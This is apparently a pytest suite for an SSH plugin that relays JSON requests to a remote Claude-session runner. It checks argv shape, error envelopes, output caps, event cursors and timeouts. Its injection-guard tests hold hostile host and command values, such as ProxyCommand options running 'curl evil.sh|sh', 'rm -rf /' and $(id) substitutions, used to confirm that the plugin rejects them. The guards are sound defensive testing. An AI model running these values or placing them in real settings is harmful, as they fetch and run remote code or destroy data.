"""SSH transport: fixed argv, JSON on stdin, and failure envelopes."""

from __future__ import annotations

import json
import subprocess
from typing import Any

import pytest

REMOTE = "~/.local/bin/hermes-claude-runner"


class RecordingRun:
    """Stands in for subprocess.run and records exactly how it was called."""

    def __init__(self, stdout: str = '{"ok":true,"result":{}}', returncode: int = 0,
                 stderr: str = "", raises: BaseException | None = None) -> None:
        self.stdout, self.returncode, self.stderr, self.raises = stdout, returncode, stderr, raises
        self.calls: list[dict[str, Any]] = []

    def __call__(self, argv, **kwargs):
        self.calls.append({"argv": argv, **kwargs})
        if self.raises is not None:
            raise self.raises
        return subprocess.CompletedProcess(argv, self.returncode, self.stdout, self.stderr)


@pytest.fixture()
def run_recorder(tools, monkeypatch) -> RecordingRun:
    recorder = RecordingRun()
    monkeypatch.setattr(tools.subprocess, "run", recorder)
    return recorder


def call(tools, name: str = "claude_status", args: dict | None = None, **kwargs) -> dict:
    handler = tools.HANDLERS[name]
    raw = handler(args if args is not None else {"run_id": "rabc12345"}, **kwargs)
    assert isinstance(raw, str), "handlers must always return a JSON string"
    return json.loads(raw)


# ── argv ───────────────────────────────────────────────────────────────────

def test_argv_is_exactly_the_documented_command(tools, run_recorder) -> None:
    call(tools)
    assert run_recorder.calls[0]["argv"] == [
        "ssh", "-o", "BatchMode=yes", "macbook", REMOTE, "rpc",
    ]


def test_transport_never_uses_a_shell(tools, run_recorder) -> None:
    call(tools)
    assert run_recorder.calls[0].get("shell", False) is False


def test_request_travels_as_json_on_stdin(tools, run_recorder) -> None:
    call(tools, "claude_status", {"run_id": "rabc12345"})
    request = json.loads(run_recorder.calls[0]["input"])
    assert request == {"action": "status", "run_id": "rabc12345"}


def test_ssh_host_and_command_come_from_plugin_settings(tools, monkeypatch) -> None:
    recorder = RecordingRun()
    monkeypatch.setattr(tools.subprocess, "run", recorder)
    tools.configure({"ssh_host": "mini", "remote_command": "/opt/runner",
                     "timeout_seconds": 420})
    try:
        call(tools)
        assert recorder.calls[0]["argv"] == [
            "ssh", "-o", "BatchMode=yes", "mini", "/opt/runner", "rpc",
        ]
        assert recorder.calls[0]["timeout"] == 420
    finally:
        tools.configure(None)


def test_settings_are_read_from_the_plugin_context(plugin, tools, monkeypatch) -> None:
    from .conftest import FakeCtx

    recorder = RecordingRun()
    monkeypatch.setattr(tools.subprocess, "run", recorder)
    ctx = FakeCtx({"ssh_host": "surface-target", "timeout_seconds": 11})
    plugin.register(ctx)
    try:
        call(tools)
        assert recorder.calls[0]["argv"][3] == "surface-target"
    finally:
        tools.configure(None)


def test_malformed_settings_fall_back_to_defaults(tools, monkeypatch) -> None:
    recorder = RecordingRun()
    monkeypatch.setattr(tools.subprocess, "run", recorder)
    tools.configure({"ssh_host": 42, "remote_command": "", "timeout_seconds": "soon"})
    try:
        call(tools)
        assert recorder.calls[0]["argv"] == [
            "ssh", "-o", "BatchMode=yes", "macbook", REMOTE, "rpc",
        ]
        assert recorder.calls[0]["timeout"] == tools.DEFAULT_TIMEOUT_SECONDS
    finally:
        tools.configure(None)


# ── hermes identity propagation ────────────────────────────────────────────

def test_session_id_and_task_id_are_forwarded(tools, run_recorder) -> None:
    call(tools, "claude_start", {"project": "demo", "prompt": "fix"},
         session_id="s-1", task_id="t-1")
    request = json.loads(run_recorder.calls[0]["input"])
    assert request["hermes_session_id"] == "s-1"
    assert request["hermes_task_id"] == "t-1"


def test_task_id_substitutes_for_a_missing_session_id(tools, run_recorder) -> None:
    call(tools, "claude_start", {"project": "demo", "prompt": "fix"}, task_id="t-9")
    request = json.loads(run_recorder.calls[0]["input"])
    assert request["hermes_session_id"] == "t-9"
    assert request["hermes_task_id"] == "t-9"


def test_absent_hermes_identity_is_sent_as_null(tools, run_recorder) -> None:
    call(tools, "claude_start", {"project": "demo", "prompt": "fix"})
    request = json.loads(run_recorder.calls[0]["input"])
    assert request["hermes_session_id"] is None
    assert request["hermes_task_id"] is None


def test_unknown_kwargs_are_ignored(tools, run_recorder) -> None:
    call(tools, "claude_status", {"run_id": "rabc12345"}, user_task="whatever", extra=1)
    assert run_recorder.calls


# ── per-tool request shapes ────────────────────────────────────────────────

def test_start_sends_every_documented_field(tools, run_recorder) -> None:
    call(tools, "claude_start",
         {"project": "demo", "prompt": "fix", "role": "reviewer", "create_worktree": False})
    request = json.loads(run_recorder.calls[0]["input"])
    assert request["action"] == "start"
    assert request["project"] == "demo"
    assert request["prompt"] == "fix"
    assert request["role"] == "reviewer"
    assert request["create_worktree"] is False


def test_start_applies_documented_defaults(tools, run_recorder) -> None:
    call(tools, "claude_start", {"project": "demo", "prompt": "fix"})
    request = json.loads(run_recorder.calls[0]["input"])
    assert request["role"] == "implementer"
    assert request["create_worktree"] is True


def test_events_defaults_the_cursor_and_limit(tools, run_recorder) -> None:
    call(tools, "claude_events", {"run_id": "rabc12345"})
    request = json.loads(run_recorder.calls[0]["input"])
    assert request == {"action": "events", "run_id": "rabc12345", "after": 0, "limit": 100}


def test_list_sends_nullable_filters(tools, run_recorder) -> None:
    call(tools, "claude_list", {})
    request = json.loads(run_recorder.calls[0]["input"])
    assert request == {"action": "list", "project": None, "status": None, "limit": 50}


@pytest.mark.parametrize("name,args,action", [
    ("claude_send", {"run_id": "rabc12345", "message": "m"}, "send"),
    ("claude_stop", {"run_id": "rabc12345"}, "stop"),
    ("claude_resume", {"run_id": "rabc12345", "message": "m"}, "resume"),
])
def test_each_tool_maps_to_its_action(tools, run_recorder, name, args, action) -> None:
    call(tools, name, args)
    assert json.loads(run_recorder.calls[0]["input"])["action"] == action


# ── local validation ───────────────────────────────────────────────────────

@pytest.mark.parametrize("args", [{}, {"project": "demo"}, {"prompt": "fix"},
                                  {"project": "", "prompt": "fix"},
                                  {"project": "demo", "prompt": ""}])
def test_start_validates_before_touching_ssh(tools, run_recorder, args) -> None:
    response = call(tools, "claude_start", args)
    assert response["ok"] is False
    assert response["error"] == "invalid_params"
    assert run_recorder.calls == [], "no ssh round trip for an obviously bad call"


def test_non_object_args_are_rejected(tools, run_recorder) -> None:
    response = json.loads(tools.HANDLERS["claude_status"]("not a dict"))
    assert response["ok"] is False
    assert run_recorder.calls == []


# ── failure envelopes ──────────────────────────────────────────────────────

def test_timeout_becomes_a_json_envelope(tools, monkeypatch) -> None:
    monkeypatch.setattr(tools.subprocess, "run",
                        RecordingRun(raises=subprocess.TimeoutExpired("ssh", 30)))
    response = call(tools)
    assert response["ok"] is False
    assert response["error"] == "ssh_timeout"
    assert "detail" in response


def test_ssh_failure_becomes_a_json_envelope(tools, monkeypatch) -> None:
    monkeypatch.setattr(tools.subprocess, "run",
                        RecordingRun(returncode=255, stdout="",
                                     stderr="ssh: connect to host macbook port 22: refused"))
    response = call(tools)
    assert response["ok"] is False
    assert response["error"] == "ssh_failed"
    assert "refused" in response["detail"]


def test_missing_ssh_binary_becomes_a_json_envelope(tools, monkeypatch) -> None:
    monkeypatch.setattr(tools.subprocess, "run",
                        RecordingRun(raises=FileNotFoundError("ssh")))
    response = call(tools)
    assert response["ok"] is False
    assert response["error"] == "ssh_unavailable"


def test_non_json_output_becomes_a_json_envelope(tools, monkeypatch) -> None:
    monkeypatch.setattr(tools.subprocess, "run",
                        RecordingRun(stdout="Warning: something\nnot json at all"))
    response = call(tools)
    assert response["ok"] is False
    assert response["error"] == "bad_response"
    assert "not json" in response["detail"]


def test_runner_error_envelope_is_passed_through(tools, monkeypatch) -> None:
    monkeypatch.setattr(tools.subprocess, "run", RecordingRun(
        stdout='{"ok":false,"error":"unknown_run","detail":"no run with id r1"}'))
    response = call(tools)
    assert response == {"ok": False, "error": "unknown_run", "detail": "no run with id r1"}


def test_stderr_noise_does_not_break_a_valid_response(tools, monkeypatch) -> None:
    monkeypatch.setattr(tools.subprocess, "run", RecordingRun(
        stdout='{"ok":true,"result":{"status":"ok"}}',
        stderr="Warning: Permanently added 'macbook' to known hosts."))
    assert call(tools)["ok"] is True


def test_unexpected_exception_becomes_a_json_envelope(tools, monkeypatch) -> None:
    monkeypatch.setattr(tools.subprocess, "run", RecordingRun(raises=RuntimeError("boom")))
    response = call(tools)
    assert response["ok"] is False
    assert response["error"] == "plugin_error"


# ── output caps ────────────────────────────────────────────────────────────

def test_oversized_responses_are_capped(tools, monkeypatch) -> None:
    payload = json.dumps({"ok": True, "result": {"blob": "x" * (tools.MAX_OUTPUT_CHARS * 3)}})
    monkeypatch.setattr(tools.subprocess, "run", RecordingRun(stdout=payload))
    raw = tools.HANDLERS["claude_status"]({"run_id": "rabc12345"})
    assert len(raw) <= tools.MAX_OUTPUT_CHARS
    parsed = json.loads(raw)
    assert parsed["ok"] is False
    assert parsed["error"] == "response_too_large"


def test_events_results_stay_within_the_cap(tools, monkeypatch) -> None:
    events = [{"seq": i, "kind": "tool_result", "payload": {"content": "y" * 400}}
              for i in range(400)]
    payload = json.dumps({"ok": True, "result": {"events": events, "next_cursor": 400,
                                                 "high_water": 400}})
    monkeypatch.setattr(tools.subprocess, "run", RecordingRun(stdout=payload))
    raw = tools.HANDLERS["claude_events"]({"run_id": "rabc12345"})
    assert len(raw) <= tools.MAX_OUTPUT_CHARS
    parsed = json.loads(raw)
    assert parsed["ok"] is True
    assert parsed["result"]["truncated"] is True
    assert len(parsed["result"]["events"]) < 400
    assert parsed["result"]["next_cursor"] == parsed["result"]["events"][-1]["seq"]


def test_oversized_prompt_is_rejected_locally(tools, run_recorder) -> None:
    response = call(tools, "claude_start",
                    {"project": "demo", "prompt": "x" * (tools.MAX_PROMPT_CHARS + 1)})
    assert response["ok"] is False
    assert run_recorder.calls == []


# ── argv injection guards ──────────────────────────────────────────────────

@pytest.mark.parametrize("host", [
    "-oProxyCommand=curl evil.sh|sh",   # ssh would read this as an option
    "-l root",
    "--",
    "mac book",
    "mac;rm -rf /",
    "mac$(whoami)",
    "mac`id`",
    "mac\nbook",
    "mac|tee",
])
def test_a_dangerous_ssh_host_falls_back_to_the_default(tools, monkeypatch, host) -> None:
    recorder = RecordingRun()
    monkeypatch.setattr(tools.subprocess, "run", recorder)
    tools.configure({"ssh_host": host})
    try:
        call(tools)
        assert recorder.calls[0]["argv"][3] == "macbook"
    finally:
        tools.configure(None)


@pytest.mark.parametrize("host", ["macbook", "mac-book-1", "user@macbook",
                                  "macbook.tail1234.ts.net", "192.168.1.10"])
def test_ordinary_ssh_hosts_are_accepted(tools, monkeypatch, host) -> None:
    recorder = RecordingRun()
    monkeypatch.setattr(tools.subprocess, "run", recorder)
    tools.configure({"ssh_host": host})
    try:
        call(tools)
        assert recorder.calls[0]["argv"][3] == host
    finally:
        tools.configure(None)


@pytest.mark.parametrize("command", [
    "hermes-claude-runner",              # neither absolute nor home-relative
    "~root/.local/bin/runner",           # a different account's home
    "~",                                 # a directory, not a command
    "/usr/bin/env sh",                   # embedded argument
    "/bin/sh -c 'curl evil|sh'",
    "/opt/runner;rm -rf /",
    "/opt/runner$(id)",
    "/opt/runner`id`",
    "/opt/runner\nrm",
    "-oProxyCommand=x",
])
def test_a_dangerous_remote_command_falls_back_to_the_default(
    tools, monkeypatch, command
) -> None:
    recorder = RecordingRun()
    monkeypatch.setattr(tools.subprocess, "run", recorder)
    tools.configure({"remote_command": command})
    try:
        call(tools)
        assert recorder.calls[0]["argv"][4] == REMOTE
    finally:
        tools.configure(None)


@pytest.mark.parametrize("command", ["/Users/someone/.local/bin/hermes-claude-runner",
                                     "~/.local/bin/hermes-claude-runner",
                                     "/opt/hermes/runner", "/usr/local/bin/runner_v2"])
def test_ordinary_remote_commands_are_accepted(tools, monkeypatch, command) -> None:
    recorder = RecordingRun()
    monkeypatch.setattr(tools.subprocess, "run", recorder)
    tools.configure({"remote_command": command})
    try:
        call(tools)
        assert recorder.calls[0]["argv"][4] == command
    finally:
        tools.configure(None)


def test_the_argv_is_always_exactly_six_elements(tools, monkeypatch) -> None:
    recorder = RecordingRun()
    monkeypatch.setattr(tools.subprocess, "run", recorder)
    tools.configure({"ssh_host": "-oProxyCommand=x", "remote_command": "/a b"})
    try:
        call(tools)
        assert len(recorder.calls[0]["argv"]) == 6
    finally:
        tools.configure(None)


# ── cursor honesty when the plugin cap bites ───────────────────────────────

def _events_response(events: list, next_cursor: int, high_water: int) -> str:
    return json.dumps({"ok": True, "result": {"events": events, "next_cursor": next_cursor,
                                              "high_water": high_water}})


def test_an_oversized_blocked_event_does_not_advance_the_cursor(tools, monkeypatch) -> None:
    """Dropping the only event must never look like the caller has seen it."""
    blocked = {"seq": 42, "kind": "blocked",
               "payload": {"questions": [{"question": "q" * 40_000}]}}
    monkeypatch.setattr(tools.subprocess, "run",
                        RecordingRun(stdout=_events_response([blocked], 42, 99)))

    parsed = json.loads(tools.HANDLERS["claude_events"](
        {"run_id": "rabc12345", "after": 41, "limit": 10}))

    result = parsed["result"]
    assert result["events"] == []
    assert result["next_cursor"] == 41, "the undelivered event must not be skipped"
    assert result["truncated"] is True
    assert result["dropped_oversized_event"] is True
    assert result["high_water"] == 99


def test_a_dropped_event_tells_the_caller_the_truth(tools, monkeypatch) -> None:
    """The advice must be reachable: the runner only stubs above its own cap,
    and claude_status returns no event payloads at all."""
    blocked = {"seq": 7, "kind": "blocked", "payload": {"q": "x" * 40_000}}
    monkeypatch.setattr(tools.subprocess, "run",
                        RecordingRun(stdout=_events_response([blocked], 7, 7)))
    result = json.loads(tools.HANDLERS["claude_events"](
        {"run_id": "rabc12345", "after": 6}))["result"]

    hint = result["hint"]
    assert result["oversized_seq"] == 7, "the caller must know which event it is"
    assert "after=7" in hint, "the only way forward is an explicit skip"
    assert "limit=1" not in hint, "a retry at limit=1 returns the same oversized event"
    assert "claude_status" not in hint, "claude_status returns no event payloads"
    assert "kind" in result and result["kind"] == "blocked"


def test_a_partial_drop_reports_the_last_delivered_event(tools, monkeypatch) -> None:
    events = [{"seq": i, "kind": "tool_result", "payload": {"c": "y" * 3000}}
              for i in range(1, 21)]
    monkeypatch.setattr(tools.subprocess, "run",
                        RecordingRun(stdout=_events_response(events, 20, 20)))

    result = json.loads(tools.HANDLERS["claude_events"](
        {"run_id": "rabc12345", "after": 0}))["result"]

    assert result["events"]
    assert result["next_cursor"] == result["events"][-1]["seq"]
    assert result["truncated"] is True
    assert result.get("dropped_oversized_event") is not True


def test_a_fitting_response_keeps_the_runner_cursor(tools, monkeypatch) -> None:
    events = [{"seq": 1, "kind": "assistant_text", "payload": {"text": "hi"}}]
    monkeypatch.setattr(tools.subprocess, "run",
                        RecordingRun(stdout=_events_response(events, 1, 1)))
    result = json.loads(tools.HANDLERS["claude_events"](
        {"run_id": "rabc12345", "after": 0}))["result"]
    assert result["next_cursor"] == 1
    assert result.get("truncated") in (False, None)


def test_plugin_shrinking_does_not_reserialize_the_whole_page(tools, monkeypatch) -> None:
    """Counts serialized characters: quadratic shrinking shows up here."""
    events = [{"seq": i, "kind": "tool_result", "payload": {"c": "y" * 400}}
              for i in range(1, 501)]
    response = _events_response(events, 500, 500)
    monkeypatch.setattr(tools.subprocess, "run", RecordingRun(stdout=response))

    serialized = {"chars": 0}
    real_dumps = tools.json.dumps

    def counting_dumps(*args, **kwargs):
        rendered = real_dumps(*args, **kwargs)
        serialized["chars"] += len(rendered)
        return rendered

    monkeypatch.setattr(tools.json, "dumps", counting_dumps)
    raw = tools.HANDLERS["claude_events"]({"run_id": "rabc12345", "after": 0})

    assert serialized["chars"] <= len(response) * 4, (
        f"quadratic shrinking: serialized {serialized['chars']} chars "
        f"for a {len(response)}-char response"
    )
    assert len(raw) <= tools.MAX_OUTPUT_CHARS


# ── the transport must outlast the runner's slowest inline work ────────────

def test_the_plugin_timeout_exceeds_the_whole_runner_chain(tools) -> None:
    """A valid run must never hide behind a misleading ssh_timeout.

    start runs `git worktree add` inline, and the rpc client waits on the
    daemon socket for it, so the ssh round trip has to outlast both.
    """
    from hermes_claude_runner import client as runner_client
    from hermes_claude_runner import worktree as runner_worktree

    assert tools.DEFAULT_TIMEOUT_SECONDS > runner_client.DEFAULT_TIMEOUT_SECONDS
    assert runner_client.DEFAULT_TIMEOUT_SECONDS > runner_worktree.GIT_TIMEOUT_SECONDS


def test_the_manifest_default_matches_the_code_default(tools) -> None:
    import yaml

    from .conftest import PLUGIN_DIR

    manifest = yaml.safe_load((PLUGIN_DIR / "plugin.yaml").read_text())
    assert manifest["config_schema"]["timeout_seconds"]["default"] == (
        tools.DEFAULT_TIMEOUT_SECONDS
    )


def test_a_configured_timeout_below_the_runner_chain_is_refused(tools, monkeypatch) -> None:
    from hermes_claude_runner import client as runner_client

    recorder = RecordingRun()
    monkeypatch.setattr(tools.subprocess, "run", recorder)
    tools.configure({"timeout_seconds": 30})
    try:
        call(tools)
        assert recorder.calls[0]["timeout"] > runner_client.DEFAULT_TIMEOUT_SECONDS
    finally:
        tools.configure(None)


def test_a_configured_timeout_above_the_floor_is_honoured(tools, monkeypatch) -> None:
    recorder = RecordingRun()
    monkeypatch.setattr(tools.subprocess, "run", recorder)
    tools.configure({"timeout_seconds": 600})
    try:
        call(tools)
        assert recorder.calls[0]["timeout"] == 600
    finally:
        tools.configure(None)


# ── the cap is exact, not approximate ──────────────────────────────────────

def _page(count: int, text_size: int, kind: str = "assistant_text") -> list:
    return [{"seq": i, "kind": kind, "payload": {"text": "y" * text_size}}
            for i in range(1, count + 1)]


def test_the_reproducing_shape_returns_events_rather_than_an_error(
    tools, monkeypatch
) -> None:
    """500 short events: JSON list separators are ', ' (2 chars), not 1.

    Counting them as 1 let the shortened page land ~192 characters over the
    cap, and _dump then threw the whole page away as response_too_large.
    """
    events = _page(500, 68)
    monkeypatch.setattr(tools.subprocess, "run",
                        RecordingRun(stdout=_events_response(events, 500, 500)))

    raw = tools.HANDLERS["claude_events"]({"run_id": "rabc12345", "after": 0})
    parsed = json.loads(raw)

    assert parsed["ok"] is True, parsed
    assert len(raw) <= tools.MAX_OUTPUT_CHARS
    result = parsed["result"]
    assert result["events"], "events must survive, not be replaced by an error"
    assert result["next_cursor"] == result["events"][-1]["seq"]
    assert result["high_water"] == 500


@pytest.mark.parametrize("text_size", [40, 60, 68, 80, 120, 150, 240, 380, 500, 700])
@pytest.mark.parametrize("count", [100, 500])
def test_a_shortened_page_never_exceeds_the_exact_cap(
    tools, monkeypatch, count: int, text_size: int
) -> None:
    events = _page(count, text_size)
    monkeypatch.setattr(tools.subprocess, "run",
                        RecordingRun(stdout=_events_response(events, count, count)))

    raw = tools.HANDLERS["claude_events"]({"run_id": "rabc12345", "after": 0})
    parsed = json.loads(raw)

    assert len(raw) <= tools.MAX_OUTPUT_CHARS, f"{len(raw)} > {tools.MAX_OUTPUT_CHARS}"
    assert parsed["ok"] is True, parsed
    result = parsed["result"]
    assert result["events"]
    assert result["next_cursor"] == result["events"][-1]["seq"]
    assert result["high_water"] == count
    assert [e["seq"] for e in result["events"]] == list(
        range(1, len(result["events"]) + 1)
    ), "the retained events must stay a contiguous prefix"


@pytest.mark.parametrize("text_size", [150, 300, 450, 700])
def test_a_default_limit_page_of_realistic_events_fits_exactly(
    tools, monkeypatch, text_size: int
) -> None:
    """The default limit is 100; these are ordinary tool-result sizes."""
    events = [{"seq": i, "kind": "tool_result",
               "payload": {"content": "z" * text_size, "is_error": False,
                           "tool_use_id": f"tu_{i}", "truncated": False}}
              for i in range(1, 101)]
    monkeypatch.setattr(tools.subprocess, "run",
                        RecordingRun(stdout=_events_response(events, 100, 100)))

    raw = tools.HANDLERS["claude_events"]({"run_id": "rabc12345"})
    parsed = json.loads(raw)

    assert len(raw) <= tools.MAX_OUTPUT_CHARS
    assert parsed["ok"] is True
    assert parsed["result"]["events"]


def test_non_ascii_events_still_respect_the_exact_cap(tools, monkeypatch) -> None:
    """_dump renders with ensure_ascii=False; sizing must use the same flags."""
    events = [{"seq": i, "kind": "assistant_text", "payload": {"text": "ü" * 200}}
              for i in range(1, 401)]
    monkeypatch.setattr(tools.subprocess, "run",
                        RecordingRun(stdout=_events_response(events, 400, 400)))

    raw = tools.HANDLERS["claude_events"]({"run_id": "rabc12345", "after": 0})

    assert len(raw) <= tools.MAX_OUTPUT_CHARS
    assert json.loads(raw)["ok"] is True


def test_the_list_separator_width_is_derived_not_guessed(tools) -> None:
    assert tools._LIST_SEPARATOR_CHARS == len(json.dumps([0, 0])) - len(json.dumps([0])) - 1
    assert tools._LIST_SEPARATOR_CHARS == 2


# ── portable defaults ──────────────────────────────────────────────────────

def test_the_default_remote_command_names_no_particular_account(tools) -> None:
    """A published plugin must reach any Mac account, not one hardcoded home."""
    assert tools.DEFAULT_REMOTE_COMMAND == "~/.local/bin/hermes-claude-runner"
    assert "/Users/" not in tools.DEFAULT_REMOTE_COMMAND


def test_the_remote_tilde_is_passed_through_for_the_macs_login_shell(
    tools, run_recorder
) -> None:
    """ssh hands the command to the remote shell, which expands the tilde."""
    call(tools)
    assert run_recorder.calls[0]["argv"][4].startswith("~/")


def test_ssh_failure_says_which_setting_to_check(tools, monkeypatch) -> None:
    monkeypatch.setattr(tools.subprocess, "run",
                        RecordingRun(returncode=255, stdout="",
                                     stderr="ssh: Could not resolve hostname macbook"))
    detail = call(tools)["detail"]
    assert "ssh_host" in detail, "a fresh install fails here; say what to configure"


def test_ssh_timeout_says_which_setting_to_check(tools, monkeypatch) -> None:
    monkeypatch.setattr(tools.subprocess, "run",
                        RecordingRun(raises=subprocess.TimeoutExpired("ssh", 240)))
    detail = call(tools)["detail"]
    assert "ssh_host" in detail
